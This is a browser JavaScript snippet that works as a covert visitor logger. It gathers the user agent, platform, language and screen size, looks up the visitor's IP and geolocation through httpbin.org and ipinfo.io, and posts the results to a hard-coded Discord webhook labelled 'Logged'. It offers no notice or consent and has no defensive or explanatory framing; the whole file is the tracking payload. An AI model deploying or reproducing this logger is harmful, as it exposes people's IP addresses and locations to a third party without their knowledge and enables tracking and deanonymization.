(async () => {
  const infos = {}
   
  infos.UserAgent = (navigator && navigator.userAgent) || "null"
  infos.Platform = (navigator && navigator.platform) || "null"
  infos.Language = (navigator && navigator.language) || "null"
  infos.ScreenSize = `${window.screen.width}x${window.screen.height}`
  
  const response = await fetch("https://httpbin.org/get")
  const data = await response.json()
  let response2, data2
  try {
    response2 = await fetch("https://ipinfo.io/json")
    data2 = await response2.json()
  } finally {}
  
  infos.IP = data.origin || "null"
  infos.Location = data2.loc || "null"
  infos.TraceId = (Object.hasOwn(data.headers, "X-Amzn-Trace-Id") && data.headers["X-Amzn-Trace-Id"]) || "null"
  infos.Provider = (typeof data2 != "undefiled" && data2.org) || "not found"
  infos.Region = (typeof data2 != "undefined" && (data2.country + " " + data2.region)) || "not found"
  
  fetch("https://discord.com/api/webhooks/1493234358037774446/Fc4HR-HGjafzlVokf65cD9RyDqQzhb_EzGKq47fjjCATLWjhUMBHxddFf2Wou6O0yh0S", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      "username": "Logged",
      "content": `IP: ${infos.IP}\nUserAgent: ${infos.UserAgent}\nPlatform: ${infos.Platform}\nTraceId: ${infos.TraceId}\nRegion: ${infos.Region}\nProvider: ${infos.Provider}\nLocation: ${infos.Location}\nReal Country: ${infos.Language}`
    })
  })
})();
